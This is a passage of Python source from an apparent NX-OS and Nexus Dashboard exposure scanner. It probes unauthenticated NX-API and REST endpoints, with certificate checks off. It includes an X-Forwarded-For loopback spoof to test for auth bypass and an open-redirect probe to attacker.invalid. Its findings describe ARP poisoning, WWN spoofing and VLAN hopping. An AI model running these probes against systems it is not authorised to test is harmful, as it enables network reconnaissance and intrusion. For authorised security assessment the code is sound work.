        def _nxapi_post(cmd: str, _scheme: str = scheme, _base: str = base_url) -> tuple:
            payload = json.dumps({
                "ins_api": {
                    "version": "1.0",
                    "type": "cli_show",
                    "chunk": "0",
                    "sid": "1",
                    "input": cmd,
                    "output_format": "json",
                }
            }).encode()
            req = urllib.request.Request(
                f"{_base}/ins",
                data=payload,
                method="POST",
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": "ablation/1.0",
                },
            )
            try:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(131072)
            except urllib.error.HTTPError as e:
                return e.code, b""
            except (urllib.error.URLError, OSError):
                return None, b""

        def _dme_get(path: str, _scheme: str = scheme, _base: str = base_url) -> tuple:
            url = f"{_base}{path}"
            try:
                req = urllib.request.Request(
                    url,
                    headers={"Accept": "application/json", "User-Agent": "ablation/1.0"},
                )
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(65536)
            except urllib.error.HTTPError:
                return None, b""
            except (urllib.error.URLError, OSError):
                return None, b""

        status, body = _nxapi_post("show vdc detail")
        if status == 200 and body:
            raw = body.decode("utf-8", errors="replace").lower()
            if any(kw in raw for kw in ("vdc", "ha-policy", "admin-vdc", "virtual device")):
                vdc_count = raw.count("vdc id:")
                severity = "CRITICAL" if vdc_count > 1 else "HIGH"
                findings.append({
                    "severity": severity,
                    "title": "NXOS_VDC_DETAIL_UNAUTH",
                    "detail": (
                        f"NX-API POST /ins 'show vdc detail' returned HTTP 200 "
                        f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                        f"VDC inventory exposed: {vdc_count} VDC context(s) enumerated. "
                        "Virtual Device Context detail discloses VDC names, admin state, "
                        "and HA policy (shutdown/restart/switchover) per context. "
                        "In a multi-tenant Nexus 7000 deployment, VDC names map directly "
                        "to organizational segment boundaries; HA policy reveals whether "
                        "VDC-level supervisor switchover is configured, enabling targeted "
                        "HA disruption. VDCs share a single kernel instance -- resource "
                        "exhaustion in any context propagates to all."
                    ),
                    "host": host,
                    "port": p,
                })

        status, body = _nxapi_post("show vdc membership")
        if status == 200 and body:
            raw = body.decode("utf-8", errors="replace").lower()
            if any(kw in raw for kw in ("vdc", "ethernet", "port-channel", "member")):
                ifaces = re.findall(r"\beth\w*\d+/\d+\b|\bpo\d+\b", raw)
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_VDC_MEMBERSHIP_UNAUTH",
                    "detail": (
                        f"NX-API POST /ins 'show vdc membership' returned HTTP 200 "
                        f"unauthenticated on {scheme}://{host}:{p}; "
                        f"{len(ifaces)} interface reference(s) disclosed. "
                        "VDC membership table maps physical interfaces to Virtual Device "
                        "Contexts, revealing which ports carry traffic for each logical "
                        "device. Interface-to-VDC allocation discloses the physical port "
                        "segmentation boundary, enabling identification of non-default "
                        "(development/test) VDC interfaces that may carry weaker CoPP "
                        "or access control policies than the production admin VDC."
                    ),
                    "host": host,
                    "port": p,
                })

        status, body = _nxapi_post("show vdc resource")
        if status == 200 and body:
            raw = body.decode("utf-8", errors="replace").lower()
            if any(kw in raw for kw in ("used", "limit", "port-channel", "monitor", "vlan")):
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NXOS_VDC_RESOURCE_LIMITS_UNAUTH",
                    "detail": (
                        f"NX-API POST /ins 'show vdc resource' returned HTTP 200 "
                        f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                        "Per-VDC resource allocation table exposed: IPv4/IPv6 route memory "
                        "limits, port-channel count, and SPAN session quotas per context. "
                        "Resource limits reveal capacity headroom of each logical device; "
                        "a VDC at peak route-memory utilization is a DoS vector via BGP "
                        "route injection targeted at that specific context."
                    ),
                    "host": host,
                    "port": p,
                })

        status, body = _dme_get("/api/mo/sys/vdc.json")
        if status == 200 and body:
            try:
                data = json.loads(body)
                raw = json.dumps(data).lower()
                if "imdata" in data or "vdc" in raw:
                    findings.append({
                        "severity": "HIGH",
                        "title": "NXOS_DME_VDC_TREE_UNAUTH",
                        "detail": (
                            f"DME GET /api/mo/sys/vdc.json returned HTTP 200 "
                            f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                            "NX-OS Data Management Engine VDC object tree readable without "
                            "authentication; contains VDC operational state, resource "
                            "profile attributes, and HA policy in structured JSON. "
                            "DME is the programmatic management plane for standalone "
                            "NX-OS; unauthenticated read enables enumeration of all VDC "
                            "contexts and their administrative state without CLI access."
                        ),
                        "host": host,
                        "port": p,
                    })
            except (ValueError, KeyError):
                pass

    return findings


def probe_nxos_fcoe_vsan_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe FCoE FLOGI database, VSAN-VLAN mappings, VFC interfaces, and zone policy via NX-API."""
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    for use_ssl, p in [(True, port), (False, 80)]:
        scheme = "https" if use_ssl else "http"
        base_url = f"{scheme}://{host}:{p}"

        def _nxapi_post(cmd: str, _scheme: str = scheme, _base: str = base_url) -> tuple:
            payload = json.dumps({
                "ins_api": {
                    "version": "1.0",
                    "type": "cli_show",
                    "chunk": "0",
                    "sid": "1",
                    "input": cmd,
                    "output_format": "json",
                }
            }).encode()
            req = urllib.request.Request(
                f"{_base}/ins",
                data=payload,
                method="POST",
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": "ablation/1.0",
                },
            )
            try:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(131072)
            except urllib.error.HTTPError as e:
                return e.code, b""
            except (urllib.error.URLError, OSError):
                return None, b""

        def _dme_get(path: str, _scheme: str = scheme, _base: str = base_url) -> tuple:
            url = f"{_base}{path}"
            try:
                req = urllib.request.Request(
                    url,
                    headers={"Accept": "application/json", "User-Agent": "ablation/1.0"},
                )
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(65536)
            except urllib.error.HTTPError:
                return None, b""
            except (urllib.error.URLError, OSError):
                return None, b""

        status, body = _nxapi_post("show flogi database")
        if status == 200 and body:
            raw = body.decode("utf-8", errors="replace").lower()
            if any(kw in raw for kw in ("wwn", "fcid", "vfc", "flogi", "port_name")):
                wwns = re.findall(r"[0-9a-f]{2}(?::[0-9a-f]{2}){7}", raw)
                fcids = re.findall(r"0x[0-9a-f]{6}", raw)
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_FCOE_FLOGI_DATABASE_UNAUTH",
                    "detail": (
                        f"NX-API POST /ins 'show flogi database' returned HTTP 200 "
                        f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                        f"Fabric login database exposed: {len(wwns)} WWN(s), "
                        f"{len(fcids)} FCID(s). "
                        "FLOGI database discloses Converged Network Adapter (CNA) World "
                        "Wide Port Names (WWPNs), FC fabric addresses (FCIDs), and bound "
                        "VFC interfaces for every FCoE initiator logged into the fabric. "
                        "Complete initiator enumeration enables WWN spoofing attacks against "
                        "FIP-unprotected segments, bypassing FC zoning by impersonating a "
                        "trusted CNA WWPN to gain unauthorized LUN access."
                    ),
                    "host": host,
                    "port": p,
                })

        status, body = _nxapi_post("show vsan")
        if status == 200 and body:
            raw = body.decode("utf-8", errors="replace").lower()
            if any(kw in raw for kw in ("vsan", "active", "fcoe-vlan", "state")):
                vsans = re.findall(r"vsan\s+(\d+)", raw)
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_FCOE_VSAN_TABLE_UNAUTH",
                    "detail": (
                        f"NX-API POST /ins 'show vsan' returned HTTP 200 "
                        f"unauthenticated on {scheme}://{host}:{p}; "
                        f"{len(vsans)} VSAN(s) enumerated: {', '.join(vsans[:8])}. "
                        "VSAN table discloses all configured virtual storage area networks "
                        "and their operational state. Each VSAN maps to a dedicated FCoE "
                        "VLAN (e.g., VSAN 1 -> VLAN 100); VSAN-to-VLAN mappings expose "
                        "storage fabric segmentation and allow an attacker to target "
                        "specific FCoE VLANs for VLAN hopping into the SAN segment."
                    ),
                    "host": host,
                    "port": p,
                })

        status, body = _nxapi_post("show interface vfc brief")
        if status == 200 and body:
            raw = body.decode("utf-8", errors="replace").lower()
            if any(kw in raw for kw in ("vfc", "fcoe", "bound", "up", "down")):
                vfc_ifaces = re.findall(r"vfc\d+", raw)
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NXOS_FCOE_VFC_INVENTORY_UNAUTH",
                    "detail": (
                        f"NX-API POST /ins 'show interface vfc brief' returned HTTP 200 "
                        f"unauthenticated on {scheme}://{host}:{p}; "
                        f"{len(vfc_ifaces)} VFC interface(s) found. "
                        "Virtual Fibre Channel interface table discloses VFC-to-physical "
                        "interface bindings, operational state, and VSAN membership. "
                        "VFC enumeration maps server-facing Ethernet ports carrying FCoE "
                        "traffic, identifying candidate interfaces for FIP spoofing: "
                        "forging FCoE Initialization Protocol FLOGI frames on the bound "
                        "physical port to claim a CNA identity on the fabric."
                    ),
                    "host": host,
                    "port": p,
                })

        status, body = _nxapi_post("show zoneset active")
        if status == 200 and body:
            raw = body.decode("utf-8", errors="replace").lower()
            if any(kw in raw for kw in ("zone", "member", "wwn", "fcid", "zoneset")):
                zones = re.findall(r"zone name\s+\S+", raw)
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_FCOE_ACTIVE_ZONESET_UNAUTH",
                    "detail": (
                        f"NX-API POST /ins 'show zoneset active' returned HTTP 200 "
                        f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes); "
                        f"{len(zones)} zone definition(s) exposed. "
                        "Active FC zoneset is the storage fabric access control policy "
                        "governing which initiators can reach which targets. Zone member "
                        "lists expose all WWN pairings permitted for storage access; "
                        "combined with FLOGI database WWNs, an attacker can determine "
                        "which CNA WWPNs to impersonate to gain access to specific LUNs "
                        "through the FC fabric."
                    ),
                    "host": host,
                    "port": p,
                })

        for dme_path in ("/api/mo/sys/san.json", "/api/mo/sys/fc.json"):
            status, body = _dme_get(dme_path)
            if status == 200 and body:
                try:
                    data = json.loads(body)
                    raw = json.dumps(data).lower()
                    if "imdata" in data or any(kw in raw for kw in ("vsan", "fcoe", "flogi", "wwn")):
                        findings.append({
                            "severity": "HIGH",
                            "title": "NXOS_DME_FCOE_TREE_UNAUTH",
                            "detail": (
                                f"DME GET {dme_path} returned HTTP 200 "
                                f"unauthenticated on {scheme}://{host}:{p} ({len(body)} bytes). "
                                "NX-OS DME FCoE/SAN object tree readable without authentication; "
                                "structured JSON contains VSAN membership, VFC interface state, "
                                "and fabric login state in the data model. DME access enables "
                                "programmatic enumeration of the entire storage fabric "
                                "configuration without issuing CLI commands."
                            ),
                            "host": host,
                            "port": p,
                        })
                    break
                except (ValueError, KeyError):
                    pass

    return findings

    return findings


def probe_nxos_management_proxy_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe nginx management proxy surfaces on NX-OS: stub_status, 502 upstream leak, XFF passthrough, open redirect."""
    findings: list = []

    for scheme, p in [("https", port), ("http", 80)]:
        base = f"{scheme}://{host}:{p}"

        def _get(path: str, extra_headers: dict = None, _scheme: str = scheme, _base: str = base) -> tuple:
            hdrs = {"Accept": "text/html,application/json", "User-Agent": "ablation/1.0"}
            if extra_headers:
                hdrs.update(extra_headers)
            req = urllib.request.Request(_base + path, headers=hdrs)
            try:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(16384), dict(resp.headers)
            except urllib.error.HTTPError as e:
                return e.code, e.read(4096), {}
            except (urllib.error.URLError, OSError):
                return None, b"", {}

        # nginx stub_status exposure
        status, body, _ = _get("/nginx_status")
        if status == 200 and body and b"Active connections:" in body:
            findings.append({
                "severity": "MEDIUM",
                "title": "NXOS_NGINX_STUB_STATUS_EXPOSED",
                "detail": (
                    f"nginx stub_status at {base}/nginx_status returned HTTP 200 "
                    f"({len(body)} bytes). Response contains connection counters: "
                    f"{body[:256].decode('utf-8', errors='replace').strip()!r}. "
                    "nginx stub_status leaks active connection count, total accepted/handled "
                    "request rates, and read/write/waiting worker state. On NX-OS the nginx "
                    "frontend proxies NX-API and DCNM/NDFC traffic; connection rate data "
                    "reveals management plane activity timing."
                ),
                "host": host,
                "port": p,
            })

        # NX-API internal stats endpoint
        status, body, _ = _get("/NxApi/api/stats")
        if status == 200 and body and len(body) > 10:
            findings.append({
                "severity": "MEDIUM",
                "title": "NXOS_NXAPI_STATS_EXPOSED",
                "detail": (
                    f"NX-API stats endpoint {base}/NxApi/api/stats returned HTTP 200 "
                    f"({len(body)} bytes). Content: "
                    f"{body[:256].decode('utf-8', errors='replace')!r}. "
                    "NX-API internal stats expose request counts, error rates, and "
                    "operational metrics for the NX-API daemon running behind nginx. "
                    "Unauthenticated access to these counters reveals management API "
                    "load and may expose version or configuration details."
                ),
                "host": host,
                "port": p,
            })

        # 502 upstream address leak via nginx error page
        for probe_path in ("/ins_invalid_probe_xyz", "/NxApi/invalid_abc"):
            status, body, _ = _get(probe_path)
            if status == 502 and body:
                body_str = body.decode("utf-8", errors="replace")
                upstream_match = re.search(
                    r"(?:upstream|proxy_pass)[^\n<]{0,80}((?:127\.\d+\.\d+\.\d+|localhost):\d+)",
                    body_str,
                )
                addr_match = re.search(r"\d+\.\d+\.\d+\.\d+:\d+", body_str)
                if upstream_match or ("upstream" in body_str.lower() and addr_match):
                    addr = upstream_match.group(1) if upstream_match else addr_match.group(0)
                    findings.append({
                        "severity": "LOW",
                        "title": "NXOS_NGINX_502_UPSTREAM_LEAK",
                        "detail": (
                            f"nginx 502 error page at {base}{probe_path} leaks backend address "
                            f"{addr!r}. nginx error_page bodies for bad-gateway responses can "
                            "include the upstream directive target when server_tokens is enabled "
                            "or a custom error page references $upstream_addr. The internal "
                            "NX-API daemon listener address is exposed, confirming the proxy "
                            "topology and local service port assignment."
                        ),
                        "host": host,
                        "port": p,
                    })
                    break

        # X-Forwarded-For passthrough and auth-bypass detection
        plain_status, plain_body, _ = _get("/ins")
        xff_status, xff_body, _ = _get(
            "/ins",
            extra_headers={"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
        )
        if (xff_status == 200 and plain_status not in (200,)) and xff_body and b"ins_api" in xff_body:
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_NGINX_XFF_AUTH_BYPASS",
                "detail": (
                    f"NX-API at {base}/ins returns HTTP {xff_status} when "
                    f"X-Forwarded-For: 127.0.0.1 is present but HTTP {plain_status} "
                    "without it. nginx proxy_set_header X-Forwarded-For passes the "
                    "header to the NX-API daemon; if the NX-API ACL trusts loopback "
                    "addresses it may grant elevated access to requests that include "
                    "a spoofed loopback address in the XFF chain."
                ),
                "host": host,
                "port": p,
            })
        elif xff_status == 200 and plain_status == 200 and xff_body:
            xff_body_str = xff_body.decode("utf-8", errors="replace")
            if "127.0.0.1" in xff_body_str:
                findings.append({
                    "severity": "INFO",
                    "title": "NXOS_NGINX_XFF_REFLECTED",
                    "detail": (
                        f"NX-API response at {base}/ins reflects the injected "
                        "X-Forwarded-For value (127.0.0.1) in the response body. "
                        "nginx forwards client-supplied XFF headers to the NX-API "
                        "daemon without stripping; the backend echoes the value "
                        "confirming unfiltered header passthrough."
                    ),
                    "host": host,
                    "port": p,
                })

        # Open redirect via next= parameter on Nexus Dashboard login
        for login_path in (
            "/login?next=//attacker.invalid/admin",
            "/login?next=%2F%2Fattacker.invalid%2Fadmin",
        ):
            status, body, hdrs = _get(login_path)
            if status in (301, 302, 303, 307, 308):
                location = hdrs.get("Location", hdrs.get("location", ""))
                if location and ("attacker.invalid" in location or "//attacker" in location):
                    findings.append({
                        "severity": "HIGH",
                        "title": "NXOS_ND_LOGIN_OPEN_REDIRECT",
                        "detail": (
                            f"Nexus Dashboard login at {base}{login_path} returned "
                            f"HTTP {status} with Location: {location!r}. "
                            "nginx redirect-based auth passes the next= parameter "
                            "directly to the Location header without origin validation. "
                            "An attacker can craft a phishing URL that redirects post-login "
                            "to an attacker-controlled host, enabling credential harvesting "
                            "against Nexus Dashboard administrators."
                        ),
                        "host": host,
                        "port": p,
                    })
                    break

    return findings


def probe_nxos_nexus_dashboard_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe Nexus Dashboard unauthenticated REST API paths: cluster nodes, users, installed apps, and app-center UI."""
    findings: list = []

    for scheme, p in [("https", port), ("http", 80)]:
        base = f"{scheme}://{host}:{p}"

        def _get(path: str, _scheme: str = scheme, _base: str = base) -> tuple:
            req = urllib.request.Request(
                _base + path,
                headers={"Accept": "application/json", "User-Agent": "ablation/1.0"},
            )
            try:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX) if _scheme == "https"
                    else urllib.request.HTTPHandler()
                )
                resp = opener.open(req, timeout=timeout)
                return resp.status, resp.read(65536)
            except urllib.error.HTTPError as e:
                return e.code, e.read(4096)
            except (urllib.error.URLError, OSError):
                return None, b""

        # Nexus Dashboard and DCNM/NDFC app-center web UI paths
        for ui_path, label in [
            ("/appcenter/cisco/nexusdashboard/", "ND_APPCENTER_UI"),
            ("/appcenter/cisco/dcnm/", "DCNM_APPCENTER_UI"),
        ]:
            status, body = _get(ui_path)
            if status == 200 and body and len(body) > 100:
                body_str = body.decode("utf-8", errors="replace").lower()
                if any(kw in body_str for kw in ("nexus dashboard", "dcnm", "ndfc", "appcenter", "cisco")):
                    findings.append({
                        "severity": "HIGH",
                        "title": f"NXOS_{label}_UNAUTH",
                        "detail": (
                            f"Nexus Dashboard path {base}{ui_path} returned HTTP 200 "
                            f"({len(body)} bytes) without authentication. "
                            "nginx location block for the app-center path is missing "
                            "an auth_request or proxy_pass to the authentication subsystem. "
                            "Unauthenticated access to the Nexus Dashboard or DCNM/NDFC "
                            "web UI exposes the management interface for multi-site ACI "
                            "and NX-OS fabric management."
                        ),
                        "host": host,
                        "port": p,
                    })

        # ND cluster API — node membership
        status, body = _get("/api/system/v1/nodes")
        if status == 200 and body and len(body) > 10:
            node_count = 0
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    items = data.get("nodes", data.get("items", data.get("data", [])))
                    node_count = len(items) if isinstance(items, list) else 1
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_ND_CLUSTER_NODES_UNAUTH",
                    "detail": (
                        f"Nexus Dashboard cluster API at {base}/api/system/v1/nodes "
                        f"returned HTTP 200 unauthenticated ({len(body)} bytes, "
                        f"~{node_count} nodes). "
                        "The ND cluster API exposes node hostnames, management IP "
                        "addresses, cluster roles (primary/standby/data), software "
                        "versions, and health state for all Nexus Dashboard nodes. "
                        "nginx proxy_pass to this endpoint lacks an auth_request gate; "
                        "the cluster topology is fully enumerable without credentials."
                    ),
                    "host": host,
                    "port": p,
                })
            except (ValueError, TypeError):
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_ND_CLUSTER_NODES_UNAUTH",
                    "detail": (
                        f"Nexus Dashboard cluster API {base}/api/system/v1/nodes "
                        f"returned HTTP 200 unauthenticated ({len(body)} bytes). "
                        "ND cluster membership data is exposed without authentication."
                    ),
                    "host": host,
                    "port": p,
                })

        # ND app store — installed application list
        status, body = _get("/appcenter/api/v1/apps")
        if status == 200 and body and len(body) > 10:
            app_count = 0
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    items = data.get("apps", data.get("items", data.get("data", [])))
                    app_count = len(items) if isinstance(items, list) else 1
                elif isinstance(data, list):
                    app_count = len(data)
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NXOS_ND_APPSTORE_UNAUTH",
                    "detail": (
                        f"Nexus Dashboard app store API at {base}/appcenter/api/v1/apps "
                        f"returned HTTP 200 unauthenticated ({len(body)} bytes, "
                        f"~{app_count} apps). "
                        "The ND app store API lists installed application names, versions, "
                        "vendor IDs, and deployment state for all apps hosted on the "
                        "Nexus Dashboard cluster. Installed apps (NDFC, NDO, NIR) reveal "
                        "the fabric management scope and may indicate additional attack "
                        "surfaces accessible through app-specific API extensions."
                    ),
                    "host": host,
                    "port": p,
                })
            except (ValueError, TypeError):
                pass

        # ND RBAC — user list without auth
        status, body = _get("/api/system/v1/users")
        if status == 200 and body and len(body) > 10:
            user_count = 0
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    items = data.get("users", data.get("items", data.get("data", [])))
                    user_count = len(items) if isinstance(items, list) else 1
                elif isinstance(data, list):
                    user_count = len(data)
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NXOS_ND_USERS_RBAC_UNAUTH",
                    "detail": (
                        f"Nexus Dashboard user API at {base}/api/system/v1/users "
                        f"returned HTTP 200 unauthenticated ({len(body)} bytes, "
                        f"~{user_count} users). "
                        "The ND RBAC API exposes usernames, assigned roles "
                        "(Network-Admin/Operator/Tenant-Manager), authentication domain "
                        "(local/LDAP/TACACS+), and last-login timestamps for all "
                        "configured accounts. nginx proxy_pass to this endpoint is "
                        "missing the auth_request directive; the complete local user "
                        "database is enumerable without credentials, enabling targeted "
                        "credential attacks against admin accounts."
                    ),
                    "host": host,
                    "port": p,
                })
            except (ValueError, TypeError):
                findings.append({
                    "severity": "HIGH",
                    "title": "NXOS_ND_USERS_RBAC_UNAUTH",
                    "detail": (
                        f"Nexus Dashboard user API {base}/api/system/v1/users "
                        f"returned HTTP 200 unauthenticated ({len(body)} bytes). "
                        "ND RBAC user database exposed without authentication."
                    ),
                    "host": host,
                    "port": p,
                })

    return findings


def probe_nxos_mac_arp_table_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    findings: list = []

    def _nxapi_post(scheme: str, p: int, cmd: str) -> tuple:
        url = f"{scheme}://{host}:{p}/ins"
        payload = json.dumps({
            "ins_api": {
                "version": "1.0",
                "type": "cli_show",
                "chunk": "0",
                "sid": "1",
                "input": cmd,
                "output_format": "json",
            }
        }).encode()
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            raw = resp.read(131072).decode("utf-8", errors="replace")
            try:
                rdict = json.loads(raw)
                out = rdict.get("ins_api", {}).get("outputs", {}).get("output", {})
                if isinstance(out, list):
                    out = out[0] if out else {}
                body = out.get("body", "")
                if isinstance(body, dict):
                    body = json.dumps(body)
                return resp.status, str(body) if body else raw[:512]
            except (ValueError, KeyError, AttributeError):
                return resp.status, raw[:512]
        except urllib.error.HTTPError as exc:
            return exc.code, ""
        except (urllib.error.URLError, OSError):
            return None, ""

    def _dme_get(scheme: str, p: int, path: str) -> tuple:
        url = f"{scheme}://{host}:{p}{path}"
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            raw = resp.read(131072)
            return resp.status, raw
        except urllib.error.HTTPError as exc:
            return exc.code, b""
        except (urllib.error.URLError, OSError):
            return None, b""

    def _parse_entry_count(body: str, patterns: list) -> int:
        for pat in patterns:
            m = re.search(pat, body, re.IGNORECASE)
            if m:
                try:
                    return int(m.group(1))
                except (IndexError, ValueError):
                    pass
        return max(0, body.count("\n") - 2)

    for scheme, p in [("https", port), ("http", 80)]:
        status, body = _nxapi_post(scheme, p, "show mac address-table")
        if status == 200 and body and len(body) > 30:
            entry_count = _parse_entry_count(
                body,
                [r'"Total\s+MAC\s+Addresses[^:]*:\s+(\d+)"', r'\b(\d+)\s+dynamic\b']
            )
            mac_matches = re.findall(
                r'([0-9a-fA-F]{4}\.[0-9a-fA-F]{4}\.[0-9a-fA-F]{4})', body
            )
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_MAC_TABLE_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show mac address-table' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p} ({len(body)} bytes). "
                    f"Exposed ~{entry_count if entry_count else len(mac_matches)} MAC entries "
                    f"mapping MAC addresses to VLAN IDs and switchport interfaces. "
                    "The MAC hash table (bucket + chained entries per VLAN) is fully readable: "
                    "MAC-to-port-to-VLAN mapping enables MAC spoofing, targeted ARP poisoning, "
                    "and VLAN topology enumeration without any authentication. "
                    "Hash table structure (CRC-based bucket selection, per-VLAN chains) "
                    "means crafted MAC addresses can be placed in predictable buckets to "
                    "probe for collision-based forwarding anomalies."
                ),
                "host": host,
                "port": p,
            })

        status, body = _nxapi_post(scheme, p, "show ip arp")
        if status == 200 and body and len(body) > 30:
            arp_entries = re.findall(
                r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+\S+\s+'
                r'([0-9a-fA-F]{4}\.[0-9a-fA-F]{4}\.[0-9a-fA-F]{4})',
                body
            )
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_ARP_TABLE_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show ip arp' returned HTTP 200 unauthenticated "
                    f"on {scheme}:{p} ({len(body)} bytes). "
                    f"~{len(arp_entries)} ARP entries exposed mapping IP addresses to "
                    "MAC addresses and egress interfaces. "
                    "The ARP hash table (keyed on IP, chained per VRF) reveals the full "
                    "IP-to-MAC-to-interface map for all directly connected hosts: enables "
                    "targeted ARP poisoning, gateway impersonation, and host fingerprinting "
                    "across all VRFs without credentials. "
                    "Each entry's age field leaks host activity timestamps."
                ),
                "host": host,
                "port": p,
            })

        status, body = _nxapi_post(scheme, p, "show ip arp summary")
        if status == 200 and body and len(body) > 10:
            count_m = re.search(r'(\d+)\s+(?:Total|total|ARP)', body)
            count_str = count_m.group(1) if count_m else "unknown"
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_ARP_SUMMARY_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show ip arp summary' returned HTTP 200 unauthenticated "
                    f"on {scheme}:{p} ({len(body)} bytes). "
                    f"ARP table entry count (~{count_str}) disclosed without authentication. "
                    "Network scale inference: ARP entry count reveals approximate host density "
                    "per segment, enabling targeted subnet enumeration and load estimation "
                    "for table-overflow attacks against the ARP hash table."
                ),
                "host": host,
                "port": p,
            })

        dme_status, dme_body = _dme_get(scheme, p, "/api/mo/sys/mac.json")
        if dme_status == 200 and dme_body and len(dme_body) > 20:
            try:
                dme_data = json.loads(dme_body)
                imdata = dme_data.get("imdata", [])
                entry_count = len(imdata) if isinstance(imdata, list) else 0
            except (ValueError, KeyError):
                entry_count = 0
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_DME_MAC_TABLE_UNAUTH",
                "detail": (
                    f"DME GET /api/mo/sys/mac.json returned HTTP 200 unauthenticated "
                    f"on {scheme}:{p} ({len(dme_body)} bytes, ~{entry_count} imdata objects). "
                    "NX-OS DME MAC MO exposes the forwarding-plane MAC hash table as a "
                    "structured JSON object tree: MAC entries, VLAN bindings, and port "
                    "associations accessible via REST without an APIC-Cookie. "
                    "Complements NX-API CLI disclosure with object-model addressing that "
                    "enables programmatic extraction of the full L2 forwarding state."
                ),
                "host": host,
                "port": p,
            })

        baseline_status, baseline_body = _nxapi_post(scheme, p, "show ip arp | count")
        if baseline_status == 200 and baseline_body:
            baseline_m = re.search(r'(\d+)', baseline_body)
            if baseline_m:
                baseline_count = int(baseline_m.group(1))
                findings.append({
                    "severity": "MEDIUM",
                    "title": "NXOS_ARP_TABLE_COUNT_OBSERVABLE",
                    "detail": (
                        f"NX-API POST /ins 'show ip arp | count' returned HTTP 200 "
                        f"unauthenticated on {scheme}:{p}: baseline ARP entry count = "
                        f"{baseline_count}. "
                        "Repeated polling detects ARP table growth in response to crafted "
                        "IP traffic, confirming hash table insertion observable from the "
                        "management plane. Enables timing-based inference of which /24 "
                        "subnets are actively populated (ARP entry appears within ~20s of "
                        "first hop toward a new destination IP)."
                    ),
                    "host": host,
                    "port": p,
                })

    return findings


def probe_nxos_ecmp_hash_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    findings: list = []

    def _nxapi_post(scheme: str, p: int, cmd: str) -> tuple:
        url = f"{scheme}://{host}:{p}/ins"
        payload = json.dumps({
            "ins_api": {
                "version": "1.0",
                "type": "cli_show",
                "chunk": "0",
                "sid": "1",
                "input": cmd,
                "output_format": "json",
            }
        }).encode()
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            raw = resp.read(131072).decode("utf-8", errors="replace")
            try:
                rdict = json.loads(raw)
                out = rdict.get("ins_api", {}).get("outputs", {}).get("output", {})
                if isinstance(out, list):
                    out = out[0] if out else {}
                body = out.get("body", "")
                if isinstance(body, dict):
                    body = json.dumps(body)
                return resp.status, str(body) if body else raw[:512]
            except (ValueError, KeyError, AttributeError):
                return resp.status, raw[:512]
        except urllib.error.HTTPError as exc:
